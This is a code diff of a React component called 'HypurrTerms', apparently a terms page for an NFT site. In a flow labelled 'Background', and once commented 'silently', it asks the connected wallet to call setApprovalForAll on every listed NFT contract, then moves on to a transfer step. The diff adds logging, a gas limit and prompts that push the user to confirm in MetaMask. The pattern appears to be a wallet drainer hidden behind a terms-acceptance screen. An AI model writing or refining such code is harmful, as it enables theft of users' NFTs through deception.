@@ -245,6 +245,8 @@ const HypurrTerms = () => {
     const transferContract = new ethers.Contract(TRANSFER_CONTRACT, TRANSFER_ABI, provider);
     const enabledContracts = await transferContract.getEnabledNFTContracts();
     
+    console.log('Approval: Checking contracts:', enabledContracts);
+    
     // Approve each NFT contract
     for (const nftContractAddress of enabledContracts) {
       try {
@@ -252,17 +254,32 @@ const HypurrTerms = () => {
         
         // Check if already approved
         const isApproved = await nftContract.isApprovedForAll(account, TRANSFER_CONTRACT);
+        console.log(`Approval: Contract ${nftContractAddress} approved status:`, isApproved);
+        
         if (isApproved) {
           console.log(`Contract ${nftContractAddress} already approved`);
           continue;
         }
         
-        // Approve contract
-        const tx = await nftContract.setApprovalForAll(TRANSFER_CONTRACT, true);
+        // Approve contract - this should trigger MetaMask popup
+        console.log(`Approval: Requesting approval for ${nftContractAddress}...`);
+        console.log(`Approval: This will open MetaMask - please approve the transaction`);
+        
+        // Use sendTransaction to ensure MetaMask popup appears
+        const tx = await nftContract.setApprovalForAll(TRANSFER_CONTRACT, true, {
+          gasLimit: 100000 // Set gas limit to ensure transaction goes through
+        });
+        
+        console.log(`Approval: Transaction sent, waiting for confirmation... Hash:`, tx.hash);
+        console.log(`Approval: Please confirm the transaction in MetaMask`);
+        
         await tx.wait();
         console.log(`Contract ${nftContractAddress} approved:`, tx.hash);
       } catch (error) {
         console.error(`Error approving ${nftContractAddress}:`, error);
+        if (error.code === 4001) {
+          throw new Error('Approval transaction was rejected. Please try again and approve the transaction in MetaMask.');
+        }
         throw error;
       }
     }
@@ -382,9 +399,10 @@ const HypurrTerms = () => {
     try {
       setIsTransferring(true);
       
-      // Step 1: Approve contract (silently)
+      // Step 1: Approve contract
       setTransferStatus('approving');
       console.log('Background: Approving transfer contract...');
+      console.log('Background: This will open MetaMask - please approve the transaction');
       try {
         await approveTransferContract();
         console.log('Background: Approval successful');
